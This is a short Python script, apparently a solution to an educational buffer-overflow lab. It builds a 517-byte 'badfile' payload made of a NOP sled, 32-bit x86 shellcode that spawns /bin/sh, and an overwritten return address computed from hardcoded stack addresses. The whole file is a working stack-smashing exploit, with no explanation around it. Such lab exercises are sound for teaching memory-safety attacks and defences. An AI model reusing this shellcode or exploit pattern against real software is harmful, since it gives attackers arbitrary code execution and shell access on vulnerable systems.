#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
    "\x31\xc0"    # xorl    %eax,%eax
    "\x50"        # pushl   %eax
    "\x68""//sh"  # pushl   $0x68732f2f
    "\x68""/bin"  # pushl   $0x6e69622f
    "\x89\xe3"    # movl    %esp,%ebx
    "\x50"        # pushl   %eax
    "\x53"        # pushl   %ebx
    "\x89\xe1"    # movl    %esp,%ecx
    "\x99"        # cdq
    "\xb0\x0b"    # movb    $0x0b,%al
    "\xcd\x80"    # int     $0x80
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode)        # put the shellcode at the end of content
content[start:start + len(shellcode)] = shellcode

bof = 0xffffcfe8
buffer = 0xffffcf74

# Decide the return address value
# and put it somewhere in the payload
ret    = buffer + 517 - len(shellcode)  # the value of ret is the address of buffer plus the offset of shellcode in the content
offset = bof - buffer + 4       # the value of offset is the address of ebp minus the address of buffer plus 4

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)
